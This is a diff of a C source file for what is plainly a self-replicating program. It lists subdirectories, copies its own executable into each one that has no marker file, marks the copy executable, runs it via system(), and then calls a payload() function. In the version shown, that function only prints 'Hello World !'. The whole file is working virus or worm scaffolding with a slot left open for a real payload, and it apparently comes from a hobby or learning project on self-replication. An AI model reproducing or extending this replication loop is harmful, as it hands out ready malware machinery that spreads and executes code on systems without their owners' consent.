@@ -1,58 +1,54 @@
 #include "../include/main.h"
 
-int main (int argc, char **argv) {
-	char *program_name = NULL;
-	char *dir_name = NULL;
-	char *program_fullpath = NULL;
-	char *dest_file = NULL;
-	char src_fullpath[MAX];
-	char dest_fullpath[MAX];
-	Directory *list = NULL;
-	Directory *it = NULL;
+void payload() {
+	printf("Hello World !\n");
+}
 
-	// init
-	program_name = basename(argv[0]);
-	dir_name = dirname(argv[0]);
-	realpath(dir_name, src_fullpath);
-	program_fullpath = (char *) malloc(strlen(src_fullpath) + strlen(program_name) + 2);
-	strcpy(program_fullpath, src_fullpath);
-	strcat(program_fullpath, "/");
-	strcat(program_fullpath, program_name);
+int main (int argc, char **argv) {
+	Directory *list = NULL;
+	Directory *iterator = NULL;
+	char *root_directory = NULL;
+	char *filename = NULL;
+	char *dest_file = NULL;
+
+	// init variables
+	filename = basename(argv[0]);
+	root_directory = dirname(argv[0]);
 	
-	// list directories	
+	// listing directories	
 	list = (Directory *) malloc(sizeof(Directory));
 	list->next = NULL;
 	list->directory = NULL;
-	listDirectories(list, dir_name);
-	it = list;
-	while (it != NULL && it->directory != NULL) {
-		dest_file = (char *) malloc(strlen(dir_name) + strlen(it->directory) + strlen (program_name) + 3);
-		strcpy(dest_file, dir_name);
-		strcat(dest_file, "/");
-		strcat(dest_file, it->directory);
-		strcat(dest_file, "/");
-		realpath(dest_file, dest_fullpath);
-		free(dest_file);
-		dest_file = (char *) malloc(strlen(dest_fullpath) + strlen(program_name) + 2);
-		strcpy(dest_file, dest_fullpath);
-		strcat(dest_file, "/");
-		strcat(dest_file, program_name);
-		
-		// if no marker in the destination directory, copy and exec program
-		if (checkMarker(dest_fullpath) == -1) {
-			copy(program_fullpath, dest_file);
-			setExecutable(dest_file);
-			system(dest_file);
-		}
+	buildList(list, root_directory);
 
-		memset(dest_fullpath, 0, MAX);
-		free(dest_file);
-		it = it->next;
+	// for each directory, copy the program if no marker file found and execute it
+	iterator = list;
+	while (iterator != NULL && iterator->directory != NULL) {
+		if (markerExists(iterator->directory) == -1) {
+
+			// get destination file path
+			dest_file = (char *) malloc(strlen(iterator->directory) + strlen(filename) + 2);
+			strcpy(dest_file, iterator->directory);
+			strcat(dest_file, "/");
+			strcat(dest_file, filename);
+
+			// copy the program in the destination directory, edit permissions and execute the new program	
+			copy(filename, dest_file);
+			setExecutable(dest_file);
+			chdir(iterator->directory);
+			system(dest_file);
+			chdir("..");
+
+			payload();
+
+			// free dynamic allocations
+			free(dest_file);
+		}
+		iterator = iterator->next;
 	}
 
-	// free dynamic allocation elements
+	// free dynamic allocations
 	freeList(list);
-	free(program_fullpath);
-
+	
 	return 0;
 }
